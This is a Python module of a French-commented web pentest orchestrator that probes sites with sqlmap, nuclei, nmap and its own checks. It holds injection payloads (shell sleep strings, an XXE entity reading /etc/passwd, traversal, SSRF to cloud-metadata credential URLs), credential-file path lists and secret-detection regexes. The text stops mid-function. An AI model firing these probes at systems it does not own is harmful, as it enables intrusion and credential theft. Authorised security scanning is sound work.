# bankai/deep.py — Python 3.13, CLI pentest orchestrator, target: sites that are yours
#
# --deep lance une passe active : fuzzing de contenu, détection CVE/misconfig
# via moteurs de templates, confirmation SQLi, scan de services, et une
# batterie de sondes natives (XSS réfléchi, SSTI, traversal, open redirect,
# méthodes HTTP dangereuses, host header injection, JWT alg=none). On
# orchestre de vrais outils déjà installés sur la machine (nuclei, sqlmap,
# nmap) plutôt que de réimplémenter leurs milliers de signatures — chacun
# reste un process externe, jamais vendorisé dans le repo.
#
# Rien ici n'écrit de donnée, ne modifie d'état côté serveur et ne dépasse
# un throttle raisonnable : ownership_hint + le --yes de cli.py restent la
# seule garde, donc ce module ne doit être appelé que sur un host déjà
# confirmé comme appartenant à l'utilisateur.

import json
import re
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import requests

from . import tools
from .models import Finding, Fix, Threat

UA = "Bankai/1.0 (audit autorisé par le propriétaire)"
TIMEOUT = 12
MARKER = "bnk4i7x"  # reflété pour prouver XSS/SSTI sans jamais exécuter de payload destructif

NUCLEI_BIN = "nuclei"
SQLMAP_BIN = "sqlmap"
NMAP_BIN = "nmap"
NIKTO_BIN = "nikto"
TESTSSL_BIN = "testssl.sh"
WPSCAN_BIN = "wpscan"
SUBFINDER_BIN = "subfinder"
AMASS_BIN = "amass"
ZAP_API = "http://127.0.0.1:8080"

# wordlist de contenu : assez large pour attraper les angles "niche" sans
# dépendre d'un fichier externe. Complétée automatiquement par seclists si
# présent sur la machine (voir discover_paths).
PATHS = [
    ".env", ".env.local", ".env.bak", ".env.old", ".env.save", ".env~",
    ".git/HEAD", ".git/config", ".git/index", ".hg/store", ".svn/entries",
    ".DS_Store", "Thumbs.db", ".idea/workspace.xml", ".vscode/sftp.json",
    "wrangler.toml", "wp-config.php", "wp-config.php.bak", "config.php.bak",
    "config.json", "config.yml", "config.yaml", "settings.py", "local_settings.py",
    "docker-compose.yml", "docker-compose.override.yml", "Dockerfile",
    "backup.zip", "backup.tar.gz", "backup.sql", "dump.sql", "db.sqlite3",
    "composer.json", "composer.lock", "package.json", "package-lock.json",
    "yarn.lock", "Gemfile", "Gemfile.lock", "requirements.txt", "Pipfile",
    "phpinfo.php", "info.php", "test.php", "debug.php", "elmah.axd", "trace.axd",
    "server-status", "server-info", "actuator/health", "actuator/env",
    "actuator/heapdump", "actuator/beans", "metrics", "debug/pprof/",
    "graphql", "graphiql", "api/swagger.json", "swagger.json", "swagger-ui.html",
    "openapi.json", "api-docs", "v1/api-docs", "api/v1/users", "api/v1/health",
    ".well-known/security.txt", "robots.txt", "sitemap.xml", "crossdomain.xml",
    "admin", "admin/login", "admin.php", "administrator", "manager/html",
    "wp-admin", "wp-login.php", "cpanel", "phpmyadmin", "pma", "adminer.php",
    ".aws/credentials", "id_rsa", "id_rsa.pub", ".ssh/id_rsa",
    "jenkins", "jenkins/login", ".well-known/openid-configuration",
    "_next/static/chunks/webpack.js", "__webpack_hmr", "storybook",
    ".git/logs/HEAD", "vendor/", "node_modules/.package-lock.json",
]

# paramètres de query dont le nom suggère un usage dangereux (SSRF, redirect,
# template, fichier) — on les repère pour les tester en priorité.
RISKY_PARAM_NAMES = {
    "url": "ssrf/redirect", "next": "redirect", "redirect": "redirect",
    "redirect_uri": "redirect", "return": "redirect", "return_url": "redirect",
    "callback": "ssrf", "webhook": "ssrf", "target": "ssrf", "dest": "redirect",
    "file": "traversal", "path": "traversal", "page": "traversal/lfi",
    "template": "ssti", "tpl": "ssti", "view": "ssti/lfi", "id": "idor/sqli",
    "q": "xss/sqli", "search": "xss/sqli", "query": "sqli",
}


def which(bin_name):
    return tools.find(bin_name)


def _finding(key, title, threat, where, evidence, impact, remedy):
    return Finding(key, title, threat, where, evidence, impact, remedy, Fix.MANUAL)


def missing_tool(f):
    """Outil absent : signalé à part, ne coûte aucun point de reiatsu."""
    return f.key.startswith("deep:tool:")


def _run(cmd, timeout):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except (subprocess.TimeoutExpired, OSError):
        return None


# ---------- 1. découverte de contenu (dirbrute) ----------

def discover_paths(root, session, step, extra_wordlist=None):
    found = []
    probe_404 = session.get(f"{root}/bnk4i-{int(time.time())}-nope", timeout=TIMEOUT,
                            headers={"User-Agent": UA})
    baseline_len = len(probe_404.text) if probe_404 is not None else -1

    paths = list(dict.fromkeys(PATHS + (extra_wordlist or [])))

    def check(p):
        try:
            r = session.get(f"{root}/{p}", timeout=TIMEOUT, headers={"User-Agent": UA},
                            allow_redirects=False)
        except requests.RequestException:
            return None
        if r.status_code in (401, 403) or (r.status_code == 200 and len(r.text) != baseline_len):
            return (p, r)
        return None

    with ThreadPoolExecutor(max_workers=12) as pool:
        futures = {pool.submit(check, p): p for p in paths}
        for fut in as_completed(futures):
            step(futures[fut])
            res = fut.result()
            if res:
                found.append(res)
    return found


def seclists_wordlist(limit=4000):
    """Si seclists est installé sur la machine (apt/brew), on pioche dedans
    au lieu de se limiter à la liste statique ci-dessus."""
    candidates = [
        "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt",
        "/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt",
        "/opt/seclists/Discovery/Web-Content/raft-small-words.txt",
    ]
    for c in candidates:
        try:
            with open(c, errors="ignore") as fh:
                return [line.strip() for line in fh.readlines()[:limit] if line.strip()]
        except OSError:
            continue
    return []


def check_content_discovery(report_findings, root, session, step):
    extra = seclists_wordlist()
    for path, r in discover_paths(root, session, step, extra):
        low = r.text.lower()
        secret_markers = ("private key", "api_key", "secret", "password", "begin rsa",
                          "aws_secret", "account_id")
        has_secret = any(m in low for m in secret_markers)
        threat = Threat.MENOS if (has_secret or r.status_code == 200 and path in (
            ".env", ".git/config", "id_rsa", ".aws/credentials")) else Threat.GILLIAN
        report_findings.append(_finding(
            f"deep:path:{path}", f"/{path} répond ({r.status_code})", threat, f"{root}/{path}",
            f"HTTP {r.status_code}, {len(r.text)} octets" + (", contient des secrets" if has_secret else ""),
            "Chemin non censé être public : surface d'attaque ou fuite directe.",
            f"Bloquer /{path} côté serveur/CDN et vérifier qu'il n'a rien d'exploitable."))


# ---------- 2. nuclei : CVE + misconfig par templates ----------

def check_nuclei(report_findings, url, step):
    step("nuclei (CVE + misconfig)")
    if not which(NUCLEI_BIN):
        report_findings.append(_finding(
            "deep:tool:nuclei", "nuclei non installé — scan CVE/misconfig sauté", Threat.MOD,
            "outillage", "Binaire `nuclei` introuvable dans le PATH.",
            "Des milliers de signatures de CVE et de mauvaises configs ne sont pas testées.",
            "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"))
        return

    proc = _run([NUCLEI_BIN, "-u", url, "-jsonl", "-silent", "-no-color",
                "-severity", "info,low,medium,high,critical",
                "-rate-limit", "50", "-timeout", "8"], timeout=600)
    if proc is None or not proc.stdout:
        return

    sev_map = {"critical": Threat.MENOS, "high": Threat.MENOS, "medium": Threat.ADJUCHAS,
              "low": Threat.GILLIAN, "info": Threat.MOD, "unknown": Threat.HOLLOW}
    for line in proc.stdout.splitlines():
        try:
            d = json.loads(line)
        except json.JSONDecodeError:
            continue
        info = d.get("info", {})
        sev = info.get("severity", "unknown")
        name = info.get("name", d.get("template-id", "signature nuclei"))
        matched = d.get("matched-at", d.get("host", url))
        report_findings.append(_finding(
            f"deep:nuclei:{d.get('template-id', name)}:{matched}",
            f"[nuclei] {name}", sev_map.get(sev, Threat.HOLLOW), matched,
            d.get("extracted-results", d.get("matcher-name", "match confirmé par template")),
            info.get("description", "Vulnérabilité ou mauvaise configuration connue, détectée par signature."),
            (info.get("remediation") or "Voir la référence du template nuclei : " +
             ",".join(info.get("reference", []) or ["pas de référence fournie"]))))


# ---------- 3. nmap : services et versions exposés ----------

def check_nmap(report_findings, host, step):
    step("nmap (services/versions)")
    if not which(NMAP_BIN):
        report_findings.append(_finding(
            "deep:tool:nmap", "nmap non installé — scan de services sauté", Threat.MOD,
            "outillage", "Binaire `nmap` introuvable dans le PATH.",
            "Les services/ports annexes (DB exposée, panel d'admin sur un autre port…) ne sont pas vus.",
            "apt install nmap / brew install nmap"))
        return

    proc = _run([NMAP_BIN, "-Pn", "-sV", "--top-ports", "200", "-T4", "-oG", "-", host],
               timeout=300)
    if proc is None:
        return
    for line in proc.stdout.splitlines():
        if not line.startswith("Host:"):
            continue
        ports_match = re.search(r"Ports: (.+?)(?:\tIgnored State|\s*$)", line)
        if not ports_match:
            continue
        for entry in ports_match.group(1).split(", "):
            fields = entry.split("/")
            if len(fields) < 7 or fields[1] != "open":
                continue
            port, proto, service, version = fields[0], fields[2], fields[4], fields[6]
            sensitive = service.lower() in (
                "mysql", "postgresql", "redis", "mongodb", "memcached", "ftp", "telnet",
                "rpcbind", "netbios-ssn", "microsoft-ds", "vnc", "rdp", "ms-wbt-server")
            report_findings.append(_finding(
                f"deep:port:{port}", f"Port {port}/{proto} ouvert ({service or 'inconnu'})",
                Threat.MENOS if sensitive else (Threat.GILLIAN if port not in ("80", "443") else Threat.MOD),
                f"{host}:{port}", f"{service} {version}".strip() or "service non identifié",
                "Un service non destiné au public augmente la surface d'attaque."
                + (" Base de données / service interne exposé directement." if sensitive else ""),
                "Fermer le port côté firewall/sécurité groupe si non nécessaire publiquement, "
                "ou le mettre derrière une authentification/VPN."))


# ---------- 4. SQLi : découverte de paramètres + confirmation sqlmap ----------

def extract_param_urls(home_url, html):
    base = home_url
    urls = set()
    for m in re.finditer(r'(?:href|action|src)=["\']([^"\']+\?[^"\']+)["\']', html, re.I):
        full = urljoin(base, m.group(1))
        if urlparse(full).netloc == urlparse(base).netloc:
            urls.add(full)
    parsed = urlparse(home_url)
    if parsed.query:
        urls.add(home_url)
    return urls


def check_sqli(report_findings, url, session, step):
    step("découverte de paramètres")
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    param_urls = extract_param_urls(url, home.text)
    if not param_urls:
        return

    step("sqlmap (confirmation SQLi)" if which(SQLMAP_BIN) else "sondes SQLi natives")
    if which(SQLMAP_BIN):
        for target in list(param_urls)[:8]:  # on borne le fan-out, pas de bruteforce massif
            proc = _run([SQLMAP_BIN, "-u", target, "--batch", "--level", "1", "--risk", "1",
                        "--random-agent", "--timeout", "15", "--retries", "1"], timeout=180)
            if proc is None:
                continue
            out = proc.stdout
            if "is vulnerable" in out or "parameter is injectable" in out.lower():
                m = re.search(r"Parameter: (\S+)", out)
                param = m.group(1) if m else "paramètre détecté"
                report_findings.append(_finding(
                    f"deep:sqli:{target}", f"Injection SQL confirmée ({param})", Threat.MENOS, target,
                    "sqlmap confirme l'injection (voir sortie sqlmap pour la technique exacte).",
                    "Lecture/écriture arbitraire de la base, parfois RCE selon le SGBD.",
                    "Utiliser des requêtes paramétrées (prepared statements) pour ce paramètre, jamais de concaténation."))
    else:
        # sondes manuelles sans sqlmap : erreurs SQL déclenchées par des méta-caractères
        error_markers = ("sql syntax", "mysql_fetch", "unclosed quotation", "odbc drivers error",
                         "pg_query", "sqlite3.operationalerror", "ora-00933", "quoted string not properly terminated")
        for target in list(param_urls)[:15]:
            parsed = urlparse(target)
            qs = dict(parse_qsl(parsed.query))
            for key in qs:
                tampered = dict(qs)
                tampered[key] = qs[key] + "'"
                probe = urlunparse(parsed._replace(query=urlencode(tampered)))
                try:
                    r = session.get(probe, timeout=TIMEOUT, headers={"User-Agent": UA})
                except requests.RequestException:
                    continue
                low = r.text.lower()
                if any(m in low for m in error_markers):
                    report_findings.append(_finding(
                        f"deep:sqli-error:{target}:{key}", f"Erreur SQL déclenchée sur « {key} »",
                        Threat.ADJUCHAS, probe,
                        "Un guillemet simple injecté fait fuiter une erreur SQL brute.",
                        "Signale une requête non paramétrée ; souvent exploitable en injection complète.",
                        "Passer ce paramètre en requête préparée et désactiver l'affichage d'erreurs SQL en prod."))


# ---------- 5. sondes natives : XSS réfléchi, SSTI, traversal, open redirect ----------

CMDI_PAYLOADS = ["; sleep {n}", "| sleep {n}", "`sleep {n}`", "$(sleep {n})",
                "&& sleep {n}", "|| sleep {n}", "\nsleep {n}\n", "; ping -c {n} 127.0.0.1 ;"]


def check_command_injection(report_findings, url, session, step):
    """Blind time-based : injecte un sleep dans chaque paramètre, compare le
    round-trip à une baseline. Pas d'OOB ici (pas de callback host configuré),
    donc ça ne couvre que l'injection qui bloque la réponse elle-même."""
    step("sondes command injection (time-based)")
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    param_urls = extract_param_urls(url, home.text) | {url}
    delay = 6

    for target in list(param_urls)[:15]:
        parsed = urlparse(target)
        qs = dict(parse_qsl(parsed.query))
        if not qs:
            continue

        try:
            baseline = requests.Session().get(target, timeout=TIMEOUT, headers={"User-Agent": UA})
            baseline_t = baseline.elapsed.total_seconds() if baseline is not None else 0
        except requests.RequestException:
            baseline_t = 0

        for key in qs:
            for template in CMDI_PAYLOADS:
                payload = qs[key] + template.format(n=delay)
                tampered = dict(qs)
                tampered[key] = payload
                probe = urlunparse(parsed._replace(query=urlencode(tampered)))
                start = time.monotonic()
                try:
                    requests.get(probe, timeout=TIMEOUT + delay + 3, headers={"User-Agent": UA})
                except requests.RequestException:
                    continue
                elapsed = time.monotonic() - start
                if elapsed - baseline_t >= delay * 0.8:
                    report_findings.append(_finding(
                        f"deep:cmdi:{target}:{key}", f"Command Injection (blind, time-based) sur « {key} »",
                        Threat.MENOS, probe,
                        f"Payload « {template.format(n=delay)} » : réponse {elapsed:.1f}s vs baseline "
                        f"{baseline_t:.1f}s (delta ≥ {delay * 0.8:.1f}s attendu pour sleep {delay}).",
                        "Le paramètre finit dans un appel shell (system/exec/subprocess) côté serveur : "
                        "exécution de commande arbitraire, souvent RCE complet.",
                        "Ne jamais construire une commande shell à partir d'une entrée utilisateur. "
                        "Utiliser une liste blanche stricte ou l'API du langage (pas de shell=True / os.system)."))
                    break  # un payload qui marche suffit pour ce paramètre, pas la peine d'insister


def check_xxe(report_findings, url, session, step):
    """XXE : endpoints qui acceptent du XML (SOAP, API legacy, upload). On
    envoie une entité externe qui pointe vers /etc/passwd ou vers une URL
    locale (SSRF via XXE) et on regarde si le contenu fuite dans la réponse."""
    step("sondes XXE")
    xxe_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<foo>&xxe;</foo>')
    for headers in ({"Content-Type": "application/xml"}, {"Content-Type": "text/xml"}):
        try:
            r = session.post(url, data=xxe_payload, headers={"User-Agent": UA, **headers},
                             timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if "root:x:0:0:" in r.text:
            report_findings.append(_finding(
                f"deep:xxe:{url}", "XXE (XML External Entity) confirmée", Threat.MENOS, url,
                f"Entité externe résolue, /etc/passwd lu dans la réponse ({headers['Content-Type']}).",
                "Lecture de fichiers arbitraires, SSRF interne, parfois DoS (billion laughs) ou RCE selon le parseur.",
                "Désactiver la résolution d'entités externes et le DOCTYPE dans le parseur XML "
                "(ex: defusedxml en Python, FEATURE_SECURE_PROCESSING en Java)."))
            break


def check_nosql_injection(report_findings, url, session, step):
    """Injection NoSQL (MongoDB) : les opérateurs Mongo passés en query string
    ou JSON (ex: ?user[$ne]=admin) contournent souvent une auth mal faite."""
    step("sondes NoSQL injection")
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    param_urls = extract_param_urls(url, home.text) | {url}
    operators = ["[$ne]=1", "[$gt]=", "[$regex]=.*", "[$exists]=true"]

    for target in list(param_urls)[:15]:
        parsed = urlparse(target)
        qs = dict(parse_qsl(parsed.query))
        if not qs:
            continue
        try:
            baseline = session.get(target, timeout=TIMEOUT, headers={"User-Agent": UA})
        except requests.RequestException:
            continue
        for key in qs:
            for op in operators:
                probe = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?" \
                       f"{urlencode({k: v for k, v in qs.items() if k != key})}" \
                       f"&{key}{op}"
                try:
                    r = session.get(probe, timeout=TIMEOUT, headers={"User-Agent": UA})
                except requests.RequestException:
                    continue
                # signe fort : la réponse change de forme (longueur très différente,
                # ou code 200 alors que la baseline était une erreur/vide) -> le
                # filtre Mongo a été réinterprété comme un objet d'opérateur.
                if baseline.status_code != 200 and r.status_code == 200 and len(r.text) > 20:
                    report_findings.append(_finding(
                        f"deep:nosqli:{target}:{key}:{op}", f"Injection NoSQL possible sur « {key} »",
                        Threat.ADJUCHAS, probe,
                        f"baseline={baseline.status_code}/{len(baseline.text)}o, "
                        f"avec opérateur Mongo={r.status_code}/{len(r.text)}o.",
                        "Un opérateur Mongo ($ne/$gt/$regex) injecté dans un paramètre peut contourner "
                        "une vérification d'auth ou extraire des données champ par champ.",
                        "Caster/valider le type attendu avant de construire la query Mongo ; "
                        "jamais passer un objet brut venant de la requête dans un filtre."))
                    break


def check_crlf_injection(report_findings, url, session, step):
    """CRLF / response splitting : %0d%0a dans un paramètre réfléchi dans un
    header (souvent Location d'une redirection) permet d'injecter des headers
    arbitraires, voire de la réponse HTTP entière (cache poisoning, XSS via header)."""
    step("sondes CRLF injection")
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    param_urls = extract_param_urls(url, home.text) | {url}
    marker = f"X-Bankai-{MARKER}"

    for target in list(param_urls)[:15]:
        parsed = urlparse(target)
        qs = dict(parse_qsl(parsed.query))
        for key in (qs or {"__bankai_probe": "1"}):
            tampered = dict(qs) if qs else {}
            tampered[key] = (qs.get(key, "") if qs else "") + f"%0d%0a{marker}:%20injected"
            probe = urlunparse(parsed._replace(query=urlencode(tampered)))
            try:
                r = session.get(probe, timeout=TIMEOUT, headers={"User-Agent": UA},
                                allow_redirects=False)
            except requests.RequestException:
                continue
            if marker.lower() in "\n".join(f"{k}:{v}" for k, v in r.headers.items()).lower():
                report_findings.append(_finding(
                    f"deep:crlf:{target}:{key}", f"CRLF injection (header splitting) sur « {key} »",
                    Threat.ADJUCHAS, probe,
                    f"Header injecté « {marker} » retrouvé dans la réponse HTTP.",
                    "Permet d'injecter des headers arbitraires (set-cookie, cache-control…) voire "
                    "de scinder la réponse pour du cache poisoning ou du XSS via header reflété.",
                    "Encoder/rejeter \\r\\n dans toute valeur utilisateur écrite dans un header de réponse."))
                break


def check_graphql(report_findings, url, session, step):
    """GraphQL : introspection activée en prod = schéma complet (requêtes,
    mutations, types internes) offert gratuitement à un attaquant."""
    step("sondes GraphQL")
    parsed = urlparse(url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    introspection_q = {"query": "query{__schema{queryType{name}} }"}
    for path in ("/graphql", "/api/graphql", "/graphql/console", "/v1/graphql"):
        try:
            r = session.post(f"{root}{path}", json=introspection_q,
                             headers={"User-Agent": UA, "Content-Type": "application/json"},
                             timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200 and '"__schema"' in r.text and '"queryType"' in r.text:
            full_q = {"query": "query{__schema{types{name fields{name}}}}"}
            try:
                full = session.post(f"{root}{path}", json=full_q,
                                    headers={"User-Agent": UA, "Content-Type": "application/json"},
                                    timeout=TIMEOUT)
                n_types = full.text.count('"name"') if full.status_code == 200 else 0
            except requests.RequestException:
                n_types = 0
            report_findings.append(_finding(
                f"deep:graphql:{path}", "Introspection GraphQL activée", Threat.ADJUCHAS,
                f"{root}{path}", f"__schema interrogeable, ~{n_types} champs listés.",
                "Expose tout le schéma interne (mutations admin, types sensibles) : une carte "
                "complète de l'API pour construire des requêtes/mutations non prévues côté UI.",
                "Désactiver l'introspection en production (introspection: false côté Apollo/graphql-js) "
                "ou la restreindre aux appels authentifiés internes."))
            break


DESERIAL_MARKERS = (
    (re.compile(r"^rO0"), "Java (base64, en-tête rO0ABX...)"),
    (re.compile(r"^(gAJ|gAN|\x80\x03|\x80\x04|\x80\x05)"), "Python pickle"),
    (re.compile(r'O:\d+:"[A-Za-z_]'), "PHP (objet sérialisé, O:N:\"Classe\")"),
)


def check_insecure_deserialization(report_findings, url, session, step):
    """Cookies/params qui transportent un blob sérialisé brut (Java, pickle,
    PHP) sont une porte vers la désérialisation arbitraire si le serveur les
    relit sans validation de type."""
    step("sondes désérialisation")
    try:
        r = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    candidates = [(c.name, c.value) for c in r.cookies]
    for k, v in (parse_qsl(urlparse(url).query) or []):
        candidates.append((k, v))
    for name, value in candidates:
        if not value:
            continue
        for pattern, label in DESERIAL_MARKERS:
            if pattern.search(value):
                report_findings.append(_finding(
                    f"deep:deserial:{name}", f"Objet sérialisé brut détecté dans « {name} »",
                    Threat.MENOS, url, f"{label} — valeur : {value[:40]}…",
                    "Si le serveur désérialise ce blob sans contrôle de type, un objet forgé "
                    "peut déclencher du code arbitraire à la désérialisation (gadget chains).",
                    "Ne jamais désérialiser une entrée non fiable ; signer/chiffrer le blob ou "
                    "passer à un format de données simple (JSON) sans objets natifs."))
                break


def check_js_bundle_secrets(report_findings, url, session, step):
    """Les secrets ne fuitent pas que dans le repo : les bundles JS livrés au
    navigateur (et leurs sourcemaps) contiennent souvent des clés API en dur
    que le code source scan (codebase.py) ne voit jamais, car il n'auditait
    que le repo local — pas ce qui est réellement exposé côté client."""
    step("secrets dans les bundles JS")
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    scripts = {urljoin(url, m) for m in re.findall(r'<script[^>]+src=["\']([^"\']+)', home.text, re.I)}
    secret_patterns = [
        ("Clé AWS", r"AKIA[0-9A-Z]{16}"),
        ("Clé Stripe live", r"sk_live_[0-9a-zA-Z]{24,}"),
        ("Clé Google", r"AIza[0-9A-Za-z\-_]{35}"),
        ("Token GitHub", r"gh[pousr]_[A-Za-z0-9]{36,}"),
        ("Secret générique", r'(?i)\b(secret|api[_-]?key|private[_-]?key)\b\s*[:=]\s*["\'][^"\'\s]{12,}["\']'),
        ("URL de connexion DB", r"(?:mongodb|postgres|mysql)://[^\s\"']{8,}"),
    ]
    for js_url in list(scripts)[:25]:
        try:
            r = session.get(js_url, timeout=TIMEOUT, headers={"User-Agent": UA})
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        for label, pattern in secret_patterns:
            m = re.search(pattern, r.text)
            if m:
                report_findings.append(_finding(
                    f"deep:js-secret:{js_url}:{label}", f"{label} exposée dans un bundle JS public",
                    Threat.MENOS, js_url, f"Motif trouvé : {m.group()[:10]}…",
                    "Ce fichier est envoyé à chaque visiteur : le secret est public, point final.",
                    "Retirer ce secret du build client, le déplacer côté serveur, et le RÉVOQUER."))
        # sourcemap : souvent oublié en prod, expose le code source non minifié
        sm = session.get(js_url + ".map", timeout=8, headers={"User-Agent": UA}) \
            if not js_url.endswith(".map") else None
        if sm is not None and sm.status_code == 200 and '"sources"' in sm.text[:2000]:
            report_findings.append(_finding(
                f"deep:sourcemap:{js_url}", "Sourcemap exposée en production", Threat.HOLLOW,
                js_url + ".map", "Le fichier .map répond 200 et contient une table 'sources'.",
                "Expose le code source non minifié (logique métier, commentaires, parfois secrets de build).",
                "Ne pas déployer les .map en prod, ou les protéger derrière une authentification."))


def check_ssrf_metadata(report_findings, url, session, step):
    """SSRF vers les endpoints de métadonnées cloud (AWS/GCP/Azure) : si un
    paramètre fait une requête serveur-side vers une URL fournie par le client,
    pointer vers 169.254.169.254 peut voler les credentials IAM de l'instance."""
    step("sondes SSRF (metadata cloud)")
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    param_urls = extract_param_urls(url, home.text) | {url}
    targets = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]
    markers = ("accesskeyid", "secretaccesskey", "computemetadata", "compute/v1",
              "expiresonhacking", "isdockerbuild")

    for target in list(param_urls)[:15]:
        parsed = urlparse(target)
        qs = dict(parse_qsl(parsed.query))
        for key in qs:
            if RISKY_PARAM_NAMES.get(key.lower(), "").split("/")[0] not in ("ssrf", "redirect"):
                continue
            for meta_url in targets:
                tampered = dict(qs)
                tampered[key] = meta_url
                probe = urlunparse(parsed._replace(query=urlencode(tampered)))
                try:
                    r = session.get(probe, timeout=TIMEOUT, headers={"User-Agent": UA})
                except requests.RequestException:
                    continue
                low = r.text.lower()
                if any(m in low for m in markers):
                    report_findings.append(_finding(
                        f"deep:ssrf:{target}:{key}", f"SSRF confirmée vers metadata cloud sur « {key} »",
                        Threat.MENOS, probe, f"Réponse contient des marqueurs de métadonnées cloud.",
                        "Vol possible des credentials IAM de l'instance/du pod : accès complet au compte cloud.",
                        "Valider ce paramètre contre une liste blanche de domaines, bloquer les plages "
                        "d'IP privées/metadata (169.254.0.0/16, 10.0.0.0/8…) côté réseau sortant."))
                    break


def check_reflection_based(report_findings, url, session, step):
    step("sondes XSS/SSTI/traversal/redirect")
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    param_urls = extract_param_urls(url, home.text) | {url}

    payloads = {
        "xss": (f'"><svg/onload={MARKER}>', lambda body: f'<svg/onload={MARKER}>' in body or f'"><svg/onload={MARKER}>' in body),
        "ssti": ("{{7*7}}", lambda body: "49" in body and "{{7*7}}" not in body),
        "traversal": ("../../../../../../etc/passwd", lambda body: "root:x:0:0:" in body),
    }

    for target in list(param_urls)[:20]:
        parsed = urlparse(target)
        qs = dict(parse_qsl(parsed.query))
        if not qs:
            continue
        for key, val in qs.items():
            hint = RISKY_PARAM_NAMES.get(key.lower())
            kinds = [hint.split("/")[0]] if hint and hint.split("/")[0] in payloads else payloads.keys()
            for kind in kinds:
                payload, detector = payloads[kind]
                tampered = dict(qs)
                tampered[key] = payload
                probe = urlunparse(parsed._replace(query=urlencode(tampered)))
                try:
                    r = session.get(probe, timeout=TIMEOUT, headers={"User-Agent": UA})
                except requests.RequestException:
                    continue
                if not detector(r.text):
                    continue
                labels = {"xss": ("XSS réfléchi", Threat.MENOS,
                                  "Un script attaquant s'exécute dans le navigateur de la victime.",
                                  "Échapper/encoder toute sortie HTML dérivée de l'entrée utilisateur (ou CSP stricte)."),
                         "ssti": ("Server-Side Template Injection", Threat.MENOS,
                                  "Le moteur de template évalue l'expression : souvent RCE complet.",
                                  "Ne jamais passer d'entrée utilisateur brute au moteur de template ; sandboxer ou échapper."),
                         "traversal": ("Path Traversal / LFI", Threat.MENOS,
                                      "Lecture de fichiers arbitraires sur le serveur (secrets, config, code source).",
                                      "Valider le paramètre contre une liste blanche de fichiers, jamais un chemin brut.")}
                title, threat, impact, remedy = labels[kind]
                report_findings.append(_finding(
                    f"deep:{kind}:{target}:{key}", f"{title} sur « {key} »", threat, probe,
                    f"Payload « {payload} » reflété/exécuté dans la réponse.", impact, remedy))


def check_http_methods(report_findings, url, session, step):
    step("méthodes HTTP dangereuses")
    for method in ("PUT", "DELETE", "TRACE", "CONNECT"):
        try:
            r = session.request(method, url, timeout=TIMEOUT, headers={"User-Agent": UA})
        except requests.RequestException:
            continue
        if r.status_code not in (501, 405, 404):
            report_findings.append(_finding(
                f"deep:method:{method}", f"Méthode {method} acceptée", Threat.GILLIAN, url,
                f"{method} répond {r.status_code} au lieu de 405/501.",
                "TRACE permet le vol de cookies HttpOnly (XST) ; PUT/DELETE peuvent permettre l'upload/suppression.",
                f"Désactiver la méthode {method} côté serveur web (bloquer explicitement)."))


def check_host_header(report_findings, url, session, step):
    step("host header injection")
    parsed = urlparse(url)
    evil_host = f"bankai-evil-{MARKER}.invalid"
    try:
        r = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA, "Host": evil_host})
    except requests.RequestException:
        return
    if evil_host in r.text or evil_host in r.headers.get("location", ""):
        report_findings.append(_finding(
            "deep:host-header", "Host header injection", Threat.ADJUCHAS, url,
            f"Le Host « {evil_host} » envoyé est reflété dans la réponse ou une redirection.",
            "Peut empoisonner des liens de reset de mot de passe ou du cache (cache poisoning).",
            "Valider le Host contre une liste fixe de domaines attendus, ignorer sinon."))


def check_jwt(report_findings, url, session, step):
    step("JWT alg=none")
    import base64
    try:
        r = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    tokens = set(re.findall(r"eyJ[\w-]+\.[\w-]+\.[\w-]*", r.text))
    for c in r.cookies:
        if re.match(r"^eyJ[\w-]+\.[\w-]+\.[\w-]*$", c.value or ""):
            tokens.add(c.value)
    for token in tokens:
        try:
            header_b64 = token.split(".")[0]
            header_b64 += "=" * (-len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
        except Exception:
            continue
        if str(header.get("alg", "")).lower() in ("none", "hs256") and header.get("alg") != "":
            if str(header.get("alg")).lower() == "none":
                report_findings.append(_finding(
                    f"deep:jwt-none:{token[:12]}", "JWT accepte alg=none", Threat.MENOS, url,
                    f"En-tête JWT : {header}", "Un token non signé peut être forgé sans clé.",
                    "Rejeter explicitement alg=none côté vérification, whitelister l'algo attendu."))
            else:
                report_findings.append(_finding(
                    f"deep:jwt-hs256:{token[:12]}", "JWT en HS256 détecté — à vérifier côté clé",
                    Threat.MOD, url, f"En-tête JWT : {header}",
                    "Si une lib RS256 accepte aussi HS256, la clé publique RS256 peut servir à forger un token HS256.",
                    "Fixer l'algorithme attendu côté code, ne jamais le lire depuis le token lui-même."))


# ---------- 6. nikto : scanner de serveur web (CGI, fichiers par défaut, misconfig) ----------

def check_nikto(report_findings, url, step):
    step("nikto (serveur web)")
    if not which(NIKTO_BIN):
